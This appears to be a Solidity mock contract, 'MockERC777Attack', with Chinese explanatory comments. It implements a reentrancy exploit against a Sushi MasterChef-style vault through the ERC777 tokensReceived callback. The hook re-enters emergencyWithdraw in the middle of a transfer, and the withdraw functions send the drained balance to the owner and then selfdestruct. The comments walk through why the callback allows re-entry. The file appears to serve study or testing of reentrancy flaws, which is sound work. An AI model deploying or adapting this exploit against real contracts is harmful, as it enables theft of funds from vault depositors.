// SPDX-License-Identifier: MIT
pragma solidity 0.6.12;
import "./MockERC777.sol";
import "./MasterChef.sol";

contract MockERC777Attack is IERC777Recipient {
    bytes32 private constant _TOKENS_RECIPIENT_INTERFACE_HASH =
        keccak256("ERC777TokensRecipient");
    // 当前合约对应了 ERC77 中的 token 接收者的身份，所以需要使用同一个 register 注册接收者身份才能实现这个代币的接收
    IERC20 token;
    IERC1820Registry internal registry;
    IMasterChef public vault; // Sushi MasterChef
    address public owner;

    constructor(
        IERC20 _token,
        IERC1820Registry _registry,
        IMasterChef _vault
    ) public {
        vault = IMasterChef(_vault);
        token = IERC20(_token);
        registry = IERC1820Registry(_registry);
        owner = msg.sender;
        // what's the usage of registry and _TOKENS_RECIPIENT_INTERFACE_HASH?
        registry.setInterfaceImplementer(
            address(this),
            _TOKENS_RECIPIENT_INTERFACE_HASH,
            address(this)
        );
    }

    // IERC777Recipient 中需要实现和覆盖的function
    // 重入实现的关键就在这里
    // 看ERC777代币的代码可以看出：ERC777代币的transfer函数调用_send函数，_send函数中最后执行的_callTokensReceived就是先检查了这个合约是否作为接收者在register中注册，然后紧接着调用了tokensReceived方法
    // 紧接着，在本次transfer调用结束之前也就是转账完成之前，会执行下面的操作提走所有的代币。
    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external override {
        require(owner == tx.origin, "no permission");
        if (
            operator == address(vault) &&
            from == address(vault) &&
            to == address(this)
        ) {
            uint balance = token.balanceOf(address(vault));
            if (balance >= amount) {
                vault.emergencyWithdraw(0);
            }
        }
    }

    function approve(address spender, uint256 amount) external {
        // deposit need enough allowance: transfer from this contract to vault
        token.approve(spender, amount);
    }

    function depositAll() public {
        require(owner == msg.sender, "Only owner can deposit");
        uint balance = token.balanceOf(address(this));
        vault.deposit(0, balance);
    }

    function withdrawAttack(uint256 _amount) public {
        require(owner == msg.sender, "Only owner can widthdraw");
        vault.withdraw(0, _amount);
        uint balance = token.balanceOf(address(this));
        token.transfer(msg.sender, balance);
        selfdestruct(payable(msg.sender));
    }

    function withdrawAllAttack() public {
        require(owner == msg.sender, "Only owner can widthdraw");
        vault.emergencyWithdraw(0);
        uint balance = token.balanceOf(address(this));
        token.transfer(msg.sender, balance);
        selfdestruct(payable(msg.sender));
    }
}

/**
 * ERC20和ERC777:
 * 转账：ERC20的代币转账是通过transfer函数实现的，其中包括对授权和余额的检查并完成转账操作。
 *      ERC777的代币转账是通过_send函数实现的，除了包含ERC20的基本功能和属性，还在转账同时触发合约中的回调函数等操作。
 * 所以ERC777相比于ERC20是一个更为高级和灵活的代币标准，ERC777包含了ERC20的所有功能和方法，并增加了一些新功能和特性。
 * 因此支持ERC20的应用和工具也可以支持ERC777，但需要作出相应修改和适配。
 */
